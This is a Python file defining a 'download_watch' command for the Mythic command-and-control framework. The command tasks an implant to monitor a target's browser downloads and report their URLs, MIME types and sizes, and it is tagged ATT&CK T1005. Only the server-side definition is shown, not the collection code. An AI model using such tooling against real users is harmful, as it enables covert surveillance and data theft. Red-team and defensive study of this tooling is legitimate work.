from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class DownloadWatchArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class DownloadWatchCommand(CommandBase):
    cmd            = "download_watch"
    needs_admin    = False
    help_cmd       = "download_watch"
    description    = (
        "Start monitoring for browser downloads. Reports each new download "
        "in real time (URL, MIME type, size). Stop with download_watch_stop."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = DownloadWatchArguments
    parameters     = []
    attackmapping  = ["T1005"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
